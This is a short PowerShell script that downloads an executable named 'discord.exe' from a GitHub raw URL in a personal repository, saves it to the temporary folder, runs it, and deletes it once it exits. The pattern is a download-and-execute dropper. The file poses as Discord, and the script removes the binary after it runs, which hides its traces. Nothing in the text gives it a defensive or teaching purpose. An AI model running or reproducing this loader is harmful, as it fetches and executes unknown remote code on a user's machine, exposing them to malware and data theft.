$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"

$tempExe = Join-Path $env:TEMP "discord.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

$proc = Start-Process $tempExe -PassThru

$proc.WaitForExit()

if (Test-Path $tempExe) {
    Remove-Item $tempExe -Force
}
